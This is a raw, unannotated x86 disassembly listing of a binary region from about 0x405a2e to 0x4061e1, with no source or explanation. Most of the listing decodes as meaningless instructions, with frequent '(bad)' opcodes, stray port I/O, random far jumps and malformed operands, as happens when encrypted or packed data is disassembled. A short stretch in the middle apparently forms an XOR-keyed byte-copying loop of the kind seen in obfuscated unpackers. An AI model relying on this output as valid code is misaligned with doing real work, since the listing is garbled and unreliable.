  405a2e:	test   BYTE PTR [eax+0x57f59602],al
  405a34:	loop   0x405a75
  405a36:	sub    DWORD PTR [ebx-0x56d23614],esp
  405a3c:	arpl   di,cx
  405a3e:	out    0x51,eax
  405a40:	and    ebp,DWORD PTR [eax+0x3d]
  405a43:	mov    ah,0xf2
  405a45:	pop    eax
  405a46:	ss daa 
  405a48:	outs   dx,DWORD PTR ds:[esi]
  405a49:	mov    ebx,0x3d9757ad
  405a4e:	pop    es
  405a4f:	xchg   ecx,eax
  405a50:	ret    0xe78d
  405a53:	stos   DWORD PTR es:[edi],eax
  405a54:	ret    0x396
  405a57:	inc    esp
  405a58:	icebp  
  405a59:	je     0x405ad2
  405a5b:	shl    ebx,0xca
  405a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a5f:	ret    
  405a60:	(bad)  
  405a63:	inc    ebp
  405a64:	push   0xffffffd8
  405a66:	dec    ecx
  405a67:	shl    BYTE PTR [edi+0x5c],1
  405a6a:	int3   
  405a6b:	xor    ah,BYTE PTR [esi+ebx*1]
  405a6e:	pop    edx
  405a6f:	pushw  0xa203
  405a73:	out    0xc9,eax
  405a75:	cmp    eax,0x2be60792
  405a7a:	adc    bl,BYTE PTR [edi+esi*2]
  405a7d:	shl    bh,cl
  405a7f:	cmp    BYTE PTR [edi],dl
  405a81:	test   DWORD PTR [ecx+ecx*4+0x3ec84a21],eax
  405a88:	enter  0x8d5f,0xcf
  405a8c:	and    eax,0x285776b2
  405a91:	cmp    eax,0x144f035a
  405a96:	je     0x405a4b
  405a98:	or     eax,esp
  405a9a:	push   ecx
  405a9b:	pop    ds
  405a9c:	push   edi
  405a9d:	in     eax,0xf
  405a9f:	in     al,0x68
  405aa1:	mov    bh,0xc7
  405aa3:	sbb    bh,BYTE PTR [ebx]
  405aa5:	xchg   ebp,eax
  405aa6:	xchg   bh,dl
  405aa8:	pop    edx
  405aa9:	add    al,0x3d
  405aab:	inc    edx
  405aac:	aam    0x1
  405aae:	cmc    
  405aaf:	sub    BYTE PTR [edx+0x6780c0e],ah
  405ab5:	aaa    
  405ab6:	std    
  405ab7:	es mov bh,0xa0
  405aba:	int    0xa8
  405abc:	mov    esi,0x2a2f7ecf
  405ac1:	ror    DWORD PTR [ecx+0x7d6cf24],cl
  405ac7:	mov    al,0xda
  405ac9:	setae  BYTE PTR [eax-0x4df6207c]
  405ad0:	or     ebp,edx
  405ad2:	shl    eax,0x57
  405ad5:	jge    0x405b56
  405ad7:	jl     0x405ad1
  405ad9:	mov    al,ds:0x14628407
  405ade:	repnz rcr DWORD PTR [edi-0x49],0x23
  405ae3:	jge    0x405af5
  405ae5:	pop    esi
  405ae6:	(bad)  
  405ae7:	pop    eax
  405ae8:	push   es
  405ae9:	ds jle 0x405b2d
  405aec:	xor    BYTE PTR [ebx],cl
  405aee:	push   ds
  405aef:	stos   DWORD PTR es:[edi],eax
  405af0:	je     0x405af5
  405af2:	xchg   esi,eax
  405af3:	fsub   DWORD PTR [ebp+0x8]
  405af6:	dec    eax
  405af7:	jmp    DWORD PTR [esp+ebp*4]
  405afa:	sub    al,0x1f
  405afc:	sbb    al,0x91
  405afe:	sbb    BYTE PTR ds:0x9b7e3e6c,al
  405b04:	push   ds
  405b05:	shr    ebx,cl
  405b07:	addr16 jg 0x405b64
  405b0a:	inc    DWORD PTR [esi]
  405b0c:	aad    0xf5
  405b0e:	xor    al,0xb2
  405b10:	or     BYTE PTR [ecx-0x3bfb0b03],al
  405b16:	push   esp
  405b17:	cld    
  405b18:	loop   0x405b6e
  405b1a:	inc    ebp
  405b1b:	loopne 0x405aa1
  405b1d:	retf   
  405b1e:	jmp    0xaab3:0x70e08455
  405b25:	xchg   DWORD PTR [esi],ebp
  405b27:	data16 ja 0x405b83
  405b2a:	inc    edx
  405b2b:	push   0xe0905a7b
  405b30:	pop    ds
  405b31:	and    ebp,DWORD PTR [ecx+0x75]
  405b34:	xchg   ecx,eax
  405b35:	in     eax,dx
  405b36:	push   ebx
  405b37:	jl     0x405b48
  405b39:	sbb    al,0xed
  405b3b:	aam    0x3
  405b3d:	out    dx,eax
  405b3e:	scas   al,BYTE PTR es:[edi]
  405b3f:	stos   DWORD PTR es:[edi],eax
  405b40:	xchg   ebp,eax
  405b41:	shr    DWORD PTR [esi+0x79799e67],cl
  405b47:	jp     0x405b07
  405b49:	jnp    0x405b20
  405b4b:	int    0x3a
  405b4d:	jle    0x405ba5
  405b4f:	enter  0xbfdb,0x1
  405b53:	loopne 0x405af3
  405b55:	sub    al,0x72
  405b57:	pop    esp
  405b58:	inc    edi
  405b59:	mov    ah,0x63
  405b5b:	es push ss
  405b5d:	or     al,0x34
  405b5f:	das    
  405b60:	popa   
  405b61:	test   al,0xcd
  405b63:	fwait
  405b64:	push   0x4d3bb09d
  405b69:	jns    0x405b04
  405b6b:	es in  al,0xd2
  405b6e:	sub    DWORD PTR [ebx-0x42],0x16
  405b72:	mov    al,0xe0
  405b74:	mov    ?,WORD PTR [edi-0x60]
  405b77:	jmp    DWORD PTR ds:0x423a1fba
  405b7d:	test   eax,0x3a374c26
  405b82:	mov    ch,0x89
  405b84:	les    esi,FWORD PTR [edx+0x632ddc49]
  405b8a:	dec    ecx
  405b8b:	adc    eax,0x321ea685
  405b90:	and    bh,BYTE PTR [ebp-0x7a]
  405b93:	cwde   
  405b94:	int3   
  405b95:	aas    
  405b96:	and    ecx,DWORD PTR [ebx]
  405b98:	mov    dl,0x91
  405b9a:	mov    cl,0x1f
  405b9c:	out    dx,eax
  405b9d:	jo     0x405b2d
  405b9f:	aam    0x55
  405ba1:	mov    WORD PTR [esi+0x26],gs
  405ba4:	int    0x45
  405ba6:	and    ecx,DWORD PTR [ebx]
  405ba8:	daa    
  405ba9:	and    al,0x42
  405bab:	out    0xe3,al
  405bad:	sub    DWORD PTR [ecx],ecx
  405baf:	imul   esi,DWORD PTR es:[ebx-0x9],0xffffff81
  405bb4:	lds    edx,FWORD PTR [ecx-0x31d9a134]
  405bba:	pop    ss
  405bbb:	inc    DWORD PTR [ebx-0x2f]
  405bbe:	in     al,0xdc
  405bc0:	or     edx,DWORD PTR [ecx]
  405bc2:	mov    dl,0x12
  405bc4:	or     al,0xd8
  405bc6:	inc    esi
  405bc7:	pop    es
  405bc8:	pop    esi
  405bc9:	pushf  
  405bca:	std    
  405bcb:	or     DWORD PTR [edi],ebx
  405bcd:	loope  0x405b78
  405bcf:	sub    BYTE PTR [ebx-0x4d5160a5],cl
  405bd5:	sahf   
  405bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bd7:	mov    ebp,0x22a3b5fc
  405bdc:	xchg   edi,eax
  405bdd:	pop    eax
  405bde:	or     dl,al
  405be0:	xchg   BYTE PTR [eax+0x35f9ca77],bl
  405be6:	mov    ebp,0x96913651
  405beb:	lods   eax,DWORD PTR ds:[esi]
  405bec:	and    ebp,DWORD PTR ds:0x52264427
  405bf2:	sub    al,0x67
  405bf4:	mov    dh,0x7b
  405bf6:	adc    DWORD PTR [edi],0xffffffbe
  405bf9:	and    al,0x20
  405bfb:	ins    BYTE PTR es:[edi],dx
  405bfc:	xor    al,0x2c
  405bfe:	ja     0x405bdd
  405c00:	push   0xffffffa9
  405c02:	mov    BYTE PTR [eax-0x27589087],bl
  405c08:	push   eax
  405c09:	xor    ch,BYTE PTR [ebp+0x4]
  405c0c:	data16 ror dh,0x2b
  405c10:	clc    
  405c11:	add    edi,DWORD PTR [ebp+0x10]
  405c14:	xor    edx,ecx
  405c16:	add    edx,esi
  405c18:	cmp    edx,edi
  405c1a:	ja     0x406428
  405c20:	push   ebx
  405c21:	jmp    0x405c2b
  405c26:	mov    esi,0x32729d
  405c2b:	mov    eax,DWORD PTR [ebp-0x8]
  405c2e:	mov    edi,DWORD PTR [ebp-0x4]
  405c31:	xor    edi,ecx
  405c33:	jmp    0x40600f
  405c38:	test   DWORD PTR [edx-0x7c],0x79ec5dea
  405c3f:	arpl   WORD PTR ds:0xb65d0ed0,dx
  405c45:	push   0x3b50711d
  405c4a:	jle    0x405cca
  405c4c:	mov    ebp,0xa07e7e71
  405c51:	aas    
  405c52:	mov    bh,0x88
  405c54:	pop    ebp
  405c55:	sbb    eax,0x8b2acd6c
  405c5a:	xchg   ebp,eax
  405c5b:	sbb    eax,0x9d20eee8
  405c60:	add    eax,0x35f8e9e0
  405c65:	xchg   DWORD PTR [edi+0x15],edx
  405c68:	sbb    bl,bl
  405c6a:	js     0x405c0f
  405c6c:	imul   edx,ebx,0xffffffec
  405c6f:	jge    0x405c91
  405c71:	push   cs
  405c72:	js     0x405cb5
  405c74:	pop    esp
  405c75:	aaa    
  405c76:	add    bh,BYTE PTR [edi+edx*1]
  405c79:	enter  0x3bd9,0x9e
  405c7d:	cmp    eax,0xbf1ff17a
  405c82:	sub    dh,BYTE PTR [eax-0x47bc8eb]
  405c88:	xchg   ebx,eax
  405c89:	test   eax,0x101a964c
  405c8e:	mov    es,WORD PTR [eax+0x6c]
  405c91:	out    0x7e,al
  405c93:	add    BYTE PTR [eax-0x45],0x31
  405c97:	jmp    0x2501:0xa99021bc
  405c9e:	fcmove st,st(3)
  405ca0:	pop    ecx
  405ca1:	das    
  405ca2:	aaa    
  405ca3:	xchg   ebx,eax
  405ca4:	mov    edx,0x932499d1
  405ca9:	ss (bad) 
  405cab:	nop
  405cac:	out    0xf9,al
  405cae:	ins    BYTE PTR es:[edi],dx
  405caf:	dec    edx
  405cb0:	int    0x74
  405cb2:	test   al,0xd2
  405cb4:	ja     0x405c72
  405cb6:	push   ecx
  405cb7:	push   edi
  405cb8:	aas    
  405cb9:	es dec edx
  405cbb:	je     0x405d25
  405cbd:	jno    0x405c4b
  405cbf:	inc    esi
  405cc0:	sbb    dh,ah
  405cc2:	(bad)  
  405cc3:	sub    eax,0x5c2a9241
  405cc8:	div    DWORD PTR [esi+ebp*1-0x7e]
  405ccc:	and    al,BYTE PTR [esi]
  405cce:	cmp    BYTE PTR [ebp+0x68],al
  405cd1:	jae    0x405c75
  405cd3:	imul   ecx,DWORD PTR [ebp+0x4483fe69],0x46
  405cda:	mov    ah,0x8a
  405cdc:	jb     0x405c8e
  405cde:	sub    eax,0xf546f758
  405ce3:	add    eax,esp
  405ce5:	jbe    0x405d4a
  405ce7:	adc    DWORD PTR [ecx+ecx*8+0x7abe1ef9],ebx
  405cee:	inc    edi
  405cef:	fdivr  st(1),st
  405cf1:	loopne 0x405cf3
  405cf3:	push   ds
  405cf4:	test   BYTE PTR [eax],cl
  405cf6:	dec    ecx
  405cf7:	mov    bh,0x7
  405cf9:	lods   al,BYTE PTR ds:[esi]
  405cfa:	jg     0x405c95
  405cfc:	mov    dl,0xdd
  405cfe:	popa   
  405cff:	dec    edi
  405d00:	pop    DWORD PTR [ecx]
  405d02:	mov    esp,0x429436ec
  405d07:	cmp    BYTE PTR [edx-0x718335e7],bl
  405d0d:	fnstsw WORD PTR [edx-0x720637ca]
  405d13:	mov    BYTE PTR [ecx],cl
  405d15:	adc    dl,dh
  405d17:	cmp    bh,BYTE PTR [edi]
  405d19:	(bad)  
  405d1b:	daa    
  405d1c:	addr16 cld 
  405d1e:	sub    esi,ebx
  405d20:	mov    edi,DWORD PTR [edx+0x3314d280]
  405d26:	dec    eax
  405d27:	cld    
  405d28:	push   eax
  405d29:	and    BYTE PTR [esi+0x3acaf33e],ch
  405d2f:	jno    0x405dad
  405d31:	mov    ds:0xaade93b4,al
  405d36:	js     0x405cd0
  405d38:	test   al,0x86
  405d3a:	pop    edi
  405d3b:	ja     0x405d96
  405d3d:	outs   dx,BYTE PTR ds:[esi]
  405d3e:	mov    BYTE PTR [ebx+eiz*8+0x4e],bl
  405d42:	pop    ss
  405d43:	add    dl,BYTE PTR [ebp-0xfdb013b]
  405d49:	out    dx,eax
  405d4a:	das    
  405d4b:	push   0x14
  405d4d:	mov    ss,WORD PTR [esi+eiz*2+0x26]
  405d51:	push   ecx
  405d52:	mov    bh,0x6c
  405d54:	xor    eax,0x44d74313
  405d59:	dec    edi
  405d5a:	fistp  DWORD PTR [esi+eax*8]
  405d5d:	idiv   esp
  405d5f:	sub    DWORD PTR [edx-0x4a],edi
  405d62:	fdiv   DWORD PTR [eax]
  405d64:	inc    ebp
  405d65:	(bad)  
  405d66:	repnz xchg dl,dl
  405d69:	out    dx,eax
  405d6a:	mov    gs,edx
  405d6c:	sbb    bh,BYTE PTR [ebx-0x4dac10d0]
  405d72:	mov    esi,0x6fa16c81
  405d77:	pop    ss
  405d78:	or     eax,0x2610ef72
  405d7d:	cdq    
  405d7e:	stc    
  405d7f:	xchg   ebx,eax
  405d80:	xchg   esi,eax
  405d81:	xchg   BYTE PTR [edx-0x57],ah
  405d84:	push   edx
  405d85:	inc    ebp
  405d86:	xchg   esi,eax
  405d87:	cdq    
  405d88:	adc    DWORD PTR [ecx-0x7c],ebx
  405d8b:	dec    esi
  405d8c:	inc    edx
  405d8d:	ja     0x405d10
  405d8f:	mov    esi,ebx
  405d91:	mov    dl,0x8e
  405d93:	pop    edi
  405d94:	xchg   DWORD PTR [ecx],ebx
  405d96:	ret    0xea6f
  405d99:	mov    ebp,0xa5a9a7f1
  405d9e:	inc    esp
  405d9f:	mov    ecx,0xc0fcf19
  405da4:	mov    bl,0xfe
  405da6:	jp     0x405d46
  405da8:	pusha  
  405da9:	and    al,0x9e
  405dab:	push   esi
  405dac:	xchg   ebx,eax
  405dad:	dec    esi
  405dae:	repz ficom DWORD PTR [ecx]
  405db1:	sbb    eax,0xd46f280f
  405db6:	mov    cl,0x8d
  405db8:	int3   
  405db9:	push   edi
  405dba:	xchg   edx,eax
  405dbb:	adc    al,0x31
  405dbd:	outs   dx,DWORD PTR ds:[esi]
  405dbe:	test   BYTE PTR [ebx],cl
  405dc0:	pop    eax
  405dc1:	lds    esi,FWORD PTR [esi+eax*1]
  405dc4:	adc    eax,0x4275183a
  405dc9:	nop
  405dca:	mov    WORD PTR [eax-0x47],es
  405dcd:	sbb    ebp,0x8ce8ae7d
  405dd3:	sti    
  405dd4:	pusha  
  405dd5:	stc    
  405dd6:	jle    0x405dd7
  405dd8:	add    DWORD PTR [edx-0x6e],esp
  405ddb:	sbb    dh,ah
  405ddd:	inc    esp
  405dde:	cmp    al,0xd2
  405de0:	mov    bl,0xe7
  405de2:	mov    cl,0xff
  405de4:	or     DWORD PTR [ebx],edi
  405de6:	or     BYTE PTR [esi+0x1],bh
  405de9:	(bad)  
  405dea:	sbb    DWORD PTR [edx+0x72be9e54],0xb03f6da0
  405df4:	xor    BYTE PTR ds:0xbded83ec,bl
  405dfa:	jmp    0x405dfb
  405dfc:	and    ebp,DWORD PTR [esi+0x54]
  405dff:	sbb    BYTE PTR [esi+0x27],dl
  405e02:	into   
  405e03:	into   
  405e04:	xchg   BYTE PTR [ecx+0x30d06062],dl
  405e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e0b:	mov    al,0x46
  405e0d:	pop    esp
  405e0e:	aad    0x78
  405e10:	jno    0x405e7b
  405e12:	test   BYTE PTR [edx+0x6f04c7fa],0xd2
  405e19:	cmp    al,0x27
  405e1b:	and    al,BYTE PTR ds:0xdc210743
  405e21:	fistp  QWORD PTR [esi+0x27]
  405e24:	push   0xffffffbe
  405e26:	xchg   edx,eax
  405e27:	or     ah,BYTE PTR [eax-0x49]
  405e2a:	out    dx,eax
  405e2b:	dec    ecx
  405e2c:	cld    
  405e2d:	jnp    0x405e6d
  405e2f:	cmp    dh,dl
  405e31:	cmp    DWORD PTR [eax-0x52],ebp
  405e34:	stos   BYTE PTR es:[edi],al
  405e35:	or     eax,0xd4739fb9
  405e3a:	ins    BYTE PTR es:[edi],dx
  405e3b:	bound  esi,QWORD PTR [edi+edx*1-0x3a46d8a1]
  405e42:	sti    
  405e43:	lahf   
  405e44:	rcr    BYTE PTR [esi+eax*8-0x1331184d],cl
  405e4b:	retf   
  405e4c:	mov    dh,0x8b
  405e4e:	mov    bh,0xad
  405e50:	call   DWORD PTR [ebp-0x1a]
  405e53:	mov    ah,0x9
  405e55:	jbe    0x405e1b
  405e57:	js     0x405e53
  405e59:	push   edi
  405e5a:	mov    WORD PTR [edx],ds
  405e5c:	pop    ds
  405e5d:	pushf  
  405e5e:	sahf   
  405e5f:	jp     0x405e0d
  405e61:	daa    
  405e62:	out    dx,eax
  405e63:	stos   BYTE PTR es:[edi],al
  405e64:	xchg   esp,eax
  405e65:	and    esi,DWORD PTR [edi+esi*2-0x592a7d5d]
  405e6c:	mov    WORD PTR [ebx],?
  405e6e:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  405e70:	gs push es
  405e72:	stos   BYTE PTR es:[edi],al
  405e73:	mov    esp,ecx
  405e75:	(bad)  
  405e76:	in     eax,0xf1
  405e78:	cwde   
  405e79:	cmp    BYTE PTR [ecx],cl
  405e7b:	xchg   edi,eax
  405e7c:	adc    DWORD PTR [eax+0x57],esi
  405e7f:	add    esi,DWORD PTR [eax-0x16]
  405e82:	or     bh,BYTE PTR [ebp+0x6a2936d1]
  405e88:	push   esi
  405e89:	jecxz  0x405e72
  405e8b:	jo     0x405e18
  405e8d:	paddsw mm4,QWORD PTR [esi+0x2639af22]
  405e94:	xchg   BYTE PTR [ebx+0x53f5c681],ah
  405e9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e9b:	repz add esp,DWORD PTR [esi+0x256d1258]
  405ea2:	(bad)  
  405ea3:	cs and eax,ebx
  405ea6:	mov    esp,0xbc599f1b
  405eab:	cmp    edx,ecx
  405ead:	push   ebp
  405eae:	jl     0x405e4b
  405eb0:	jle    0x405e6e
  405eb2:	mov    al,ds:0xf2ca51a4
  405eb7:	sub    eax,0xdd26c89f
  405ebc:	(bad)  
  405ebd:	cmc    
  405ebe:	sbb    al,BYTE PTR [ebx]
  405ec0:	mov    bh,0x91
  405ec2:	imul   edi,DWORD PTR [ebp+0x7c100ec],0xf6967100
  405ecc:	jnp    0x405e62
  405ece:	mov    edx,0xa629471a
  405ed3:	xor    dl,cl
  405ed5:	call   0x7360:0xe62a9e32
  405edc:	scas   al,BYTE PTR es:[edi]
  405edd:	cmp    ah,BYTE PTR [edx-0x94be20e]
  405ee3:	out    dx,eax
  405ee4:	xchg   edx,eax
  405ee5:	test   al,0xea
  405ee7:	clc    
  405ee8:	dec    esp
  405ee9:	lods   al,BYTE PTR ds:[esi]
  405eea:	add    eax,0x96431908
  405eef:	push   esi
  405ef0:	cmp    eax,eax
  405ef2:	inc    edx
  405ef3:	mov    DWORD PTR [eax],esp
  405ef5:	adc    DWORD PTR [eax],ebx
  405ef7:	dec    esp
  405ef8:	out    0xf4,al
  405efa:	inc    ebp
  405efb:	pop    es
  405efc:	push   esi
  405efd:	cwde   
  405efe:	and    BYTE PTR [esi+0x47e213fb],bh
  405f04:	mov    al,0x39
  405f06:	leave  
  405f07:	and    esi,ebp
  405f09:	sbb    cl,BYTE PTR [ecx]
  405f0b:	(bad)  
  405f0c:	retf   
  405f0d:	cmp    ah,BYTE PTR [edx+eax*1-0xdbc1366]
  405f14:	adc    al,BYTE PTR [esi]
  405f16:	adc    DWORD PTR [esi-0x3c961330],ebx
  405f1c:	add    eax,0x5a8848
  405f21:	ret    0xe0a7
  405f24:	jmp    0x784f52d9
  405f29:	out    0xc1,al
  405f2b:	cli    
  405f2c:	adc    DWORD PTR [eax+0x3c24ae36],eax
  405f32:	dec    edi
  405f33:	lds    edx,FWORD PTR [ebp-0x50]
  405f36:	mov    ebp,?
  405f38:	rcr    BYTE PTR [eax+0x13e698bd],cl
  405f3e:	outs   dx,DWORD PTR ds:[esi]
  405f3f:	cld    
  405f40:	out    dx,al
  405f41:	and    DWORD PTR [ecx-0x315666a5],ecx
  405f47:	retf   
  405f48:	jo     0x405fa5
  405f4a:	adc    DWORD PTR [edi-0x72],0x52
  405f4e:	inc    eax
  405f4f:	mov    ebp,0x48151fba
  405f54:	aam    0xcf
  405f56:	mov    ch,0x3c
  405f58:	lods   al,BYTE PTR ds:[esi]
  405f59:	jo     0x405f88
  405f5b:	and    edi,DWORD PTR [edi+0x29b0469f]
  405f61:	(bad)  
  405f62:	imul   esp,DWORD PTR [edx+0x2308d85d],0x7d173d41
  405f6c:	lock rcr BYTE PTR cs:[edi+0x2b],0x56
  405f72:	ds inc esi
  405f74:	cwde   
  405f75:	and    al,0x66
  405f77:	xor    DWORD PTR [esp+eiz*4],0x4f
  405f7b:	inc    edi
  405f7c:	repz test ch,bh
  405f7f:	xor    DWORD PTR [ebx],ebp
  405f81:	idiv   DWORD PTR [edi-0x20]
  405f84:	adc    eax,0xd08f1d81
  405f89:	push   ss
  405f8a:	jl     0x405f3b
  405f8c:	mov    ecx,0x86de652c
  405f91:	push   ss
  405f92:	inc    esi
  405f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f94:	inc    ecx
  405f95:	data16 jp 0x405f74
  405f98:	out    dx,eax
  405f99:	jbe    0x405f29
  405f9b:	es retf 0x2612
  405f9f:	loop   0x405f35
  405fa1:	mov    al,0xd6
  405fa3:	pushf  
  405fa4:	mul    DWORD PTR [edi]
  405fa6:	cmp    esi,DWORD PTR [edi]
  405fa8:	jp     0x405fed
  405faa:	and    DWORD PTR [ecx+eiz*2-0x20],esp
  405fae:	dec    eax
  405faf:	or     cl,ah
  405fb1:	imul   esp,DWORD PTR [edi+esi*8+0x462d0bb2],0x6b380442
  405fbc:	cmp    al,0x8c
  405fbe:	inc    edx
  405fbf:	or     ah,BYTE PTR [ebp-0x4a47eb8]
  405fc5:	std    
  405fc6:	sub    eax,0x46734ee2
  405fcb:	inc    ebp
  405fcc:	xchg   esp,eax
  405fcd:	ins    DWORD PTR es:[edi],dx
  405fce:	mov    bl,0x60
  405fd0:	int    0xae
  405fd2:	dec    ecx
  405fd3:	sbb    eax,0x3105d600
  405fd8:	jne    0x405fbe
  405fda:	mov    dh,0x16
  405fdc:	sbb    eax,0x9688927f
  405fe1:	and    eax,0xb266e70b
  405fe6:	inc    eax
  405fe7:	mov    ch,0x13
  405fe9:	sar    DWORD PTR [edx+0x1c],0x43
  405fed:	scas   eax,DWORD PTR es:[edi]
  405fee:	jp     0x405fd5
  405ff0:	xor    ch,ch
  405ff2:	adc    al,0x8d
  405ff4:	retf   
  405ff5:	in     al,dx
  405ff6:	push   cs
  405ff7:	xchg   edx,eax
  405ff8:	xchg   ebp,eax
  405ff9:	mov    ebx,0x98f435e2
  405ffe:	inc    esp
  405fff:	pushf  
  406000:	cwde   
  406001:	inc    esi
  406002:	cmc    
  406003:	lahf   
  406004:	aaa    
  406005:	add    esp,DWORD PTR [eax-0x687bf82d]
  40600b:	imul   DWORD PTR [edi-0x1fc73d2]
  406011:	mov    esi,DWORD PTR [ebp+0x8]
  406014:	imul   edi,edx
  406017:	mov    ebx,DWORD PTR [ebp+0xc]
  40601a:	xor    eax,ecx
  40601c:	add    eax,edx
  40601e:	mov    al,BYTE PTR [ebx+eax*1+0x32729d]
  406025:	mov    BYTE PTR [edi+esi*1],al
  406028:	mov    eax,DWORD PTR [ebp-0x4]
  40602b:	xor    eax,ecx
  40602d:	lea    edx,[edx+eax*1+0x32729d]
  406034:	mov    eax,DWORD PTR [ebp-0x4]
  406037:	xor    eax,ecx
  406039:	mov    esi,0xffcd8d63
  40603e:	sub    esi,eax
  406040:	add    esi,DWORD PTR [ebp+0x10]
  406043:	cmp    edx,esi
  406045:	jmp    0x406421
  40604a:	fdivr  st(7),st
  40604c:	es fwait
  40604e:	jge    0x40600b
  406050:	jge    0x40609b
  406052:	jae    0x4060cf
  406054:	dec    edx
  406055:	pusha  
  406056:	dec    esi
  406057:	push   ebx
  406058:	addr16 mov esi,0x7e7e3f9f
  40605e:	mov    ebp,0x327e7e71
  406063:	xchg   ebp,eax
  406064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406065:	mov    ecx,0x24873c34
  40606a:	cmp    eax,0xee9b2aee
  40606f:	xor    dl,BYTE PTR [edi]
  406071:	sub    eax,DWORD PTR [eax]
  406073:	pop    ebx
  406074:	in     al,0x95
  406076:	addr16 xchg ecx,eax
  406078:	pusha  
  406079:	mov    ah,0xb2
  40607b:	push   0xe4e17178
  406080:	sar    DWORD PTR [ecx+ebp*8-0x3c01f49f],cl
  406087:	(bad)  [eax]
  406089:	mov    bl,0xb2
  40608b:	push   0xffffffbd
  40608d:	leave  
  40608e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40608f:	push   ss
  406090:	in     al,0x38
  406092:	hlt    
  406093:	push   0x1b
  406095:	add    BYTE PTR [ecx],al
  406097:	pop    ss
  406098:	push   ecx
  406099:	jb     0x40602b
  40609b:	and    esi,DWORD PTR [esi]
  40609d:	push   0x14
  40609f:	ja     0x406031
  4060a1:	(bad)  
  4060a2:	into   
  4060a3:	add    DWORD PTR ss:[eax-0x7c402642],ebx
  4060aa:	iret   
  4060ab:	push   ecx
  4060ac:	pop    es
  4060ad:	fadd   QWORD PTR [ecx]
  4060af:	jo     0x40606d
  4060b1:	mov    al,ds:0xc18351fe
  4060b6:	shl    DWORD PTR [ebp+edx*1+0x7ace3bc3],1
  4060bd:	out    dx,eax
  4060be:	gs and al,0x4c
  4060c1:	aas    
  4060c2:	push   ebx
  4060c3:	stc    
  4060c4:	imul   edx,DWORD PTR [ecx+0x1a],0x656d11df
  4060cb:	xchg   esp,eax
  4060cc:	mov    edi,0x7e803071
  4060d1:	in     eax,dx
  4060d2:	fistp  QWORD PTR [edx]
  4060d4:	xor    eax,0x59856611
  4060d9:	hlt    
  4060da:	pop    es
  4060db:	and    al,0x42
  4060dd:	test   DWORD PTR [ebp-0x65ba44fb],0xed7f4d26
  4060e7:	xor    ch,ah
  4060e9:	(bad)  
  4060ea:	sti    
  4060eb:	aaa    
  4060ec:	call   FWORD PTR [ebx]
  4060ee:	ja     0x406080
  4060f0:	xor    BYTE PTR [eax],ah
  4060f2:	inc    esp
  4060f3:	imul   ebx,DWORD PTR [esi],0xfffffff0
  4060f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060f7:	add    ch,BYTE PTR [eax+0x50]
  4060fa:	ds jmp 0x406116
  4060fd:	inc    edx
  4060fe:	aas    
  4060ff:	sbb    eax,DWORD PTR [eax-0x56]
  406102:	outs   dx,BYTE PTR ds:[esi]
  406103:	lds    ebp,FWORD PTR [edx+0x2e7dccc7]
  406109:	adc    DWORD PTR [edx],ecx
  40610b:	(bad)  
  40610d:	xor    DWORD PTR [edi+0x590e89af],edi
  406113:	dec    eax
  406114:	ss xor eax,0x62d224f7
  40611a:	mov    ebp,0x7a54718b
  40611f:	fisttp DWORD PTR ds:0xe11034c1
  406125:	jle    0x406143
  406127:	pop    esp
  406128:	int3   
  406129:	aad    0xaf
  40612b:	ja     0x4060ee
  40612d:	pushf  
  40612e:	into   
  40612f:	xlat   BYTE PTR ds:[ebx]
  406130:	in     eax,0x39
  406132:	inc    eax
  406133:	hlt    
  406134:	mov    WORD PTR [edx],cs
  406136:	popf   
  406137:	pop    ebx
  406138:	sbb    DWORD PTR [eax+0x7119a8c4],ebx
  40613e:	sub    BYTE PTR [esi-0xcaab71a],bl
  406144:	(bad)  
  406145:	in     al,dx
  406146:	push   eax
  406147:	inc    ecx
  406148:	(bad)  
  406149:	leave  
  40614a:	sub    edx,DWORD PTR ds:0x64cbac05
  406150:	cli    
  406151:	push   ebx
  406152:	lods   al,BYTE PTR ds:[esi]
  406153:	pushf  
  406154:	and    BYTE PTR [eax],bh
  406156:	xchg   esp,eax
  406157:	popf   
  406158:	pop    ecx
  406159:	(bad)  
  40615a:	out    0x38,al
  40615c:	xor    DWORD PTR [eax-0x6b],edi
  40615f:	rol    BYTE PTR [ebp+0x5bf58ce],0x49
  406166:	jmp    0x40615d
  406168:	jl     0x4061cd
  40616a:	xor    eax,0x492ea038
  40616f:	stos   BYTE PTR es:[edi],al
  406170:	imul   esp,DWORD PTR [edx-0x47],0x644f85bb
  406177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406178:	clc    
  406179:	call   ecx
  40617b:	jl     0x4061da
  40617d:	pop    esp
  40617e:	rcr    DWORD PTR [edx-0x62a0c25b],cl
  406184:	outs   dx,BYTE PTR ds:[esi]
  406185:	xchg   ecx,eax
  406186:	xor    ch,BYTE PTR [edi+0x513f3b87]
  40618c:	inc    esi
  40618d:	inc    esi
  40618e:	fwait
  40618f:	push   edi
  406190:	or     edx,DWORD PTR [eax]
  406192:	or     eax,0x7bca97f
  406197:	std    
  406198:	add    cl,BYTE PTR [esi-0x6267f8ab]
  40619e:	outs   dx,BYTE PTR cs:[esi]
  4061a0:	ins    DWORD PTR es:[edi],dx
  4061a1:	lds    eax,FWORD PTR [ebp+0x73]
  4061a4:	sbb    ebp,DWORD PTR [ebx+0x67]
  4061a7:	fstp   QWORD PTR [esi-0x41]
  4061aa:	mov    WORD PTR [esi],gs
  4061ac:	add    cl,BYTE PTR [edi-0x6f7a338d]
  4061b2:	daa    
  4061b3:	addr16 je 0x406183
  4061b6:	and    al,0xd5
  4061b8:	sub    BYTE PTR [ebp-0x649c017e],bh
  4061be:	lock mov ebx,DWORD PTR [ebp+ecx*2+0x4ea7fbd9]
  4061c6:	or     eax,0xa309818c
  4061cb:	aaa    
  4061cc:	leave  
  4061cd:	mov    al,0x6
  4061cf:	mov    ds,WORD PTR gs:[esi+0x5864bc9c]
  4061d6:	push   cs
  4061d7:	aaa    
  4061d8:	inc    ebx
  4061d9:	test   BYTE PTR [esi],dh
  4061db:	iret   
  4061dc:	es stos DWORD PTR es:[edi],eax
  4061de:	ret    0xda0f
  4061e1:	ins    DWORD PTR es:[edi],dx
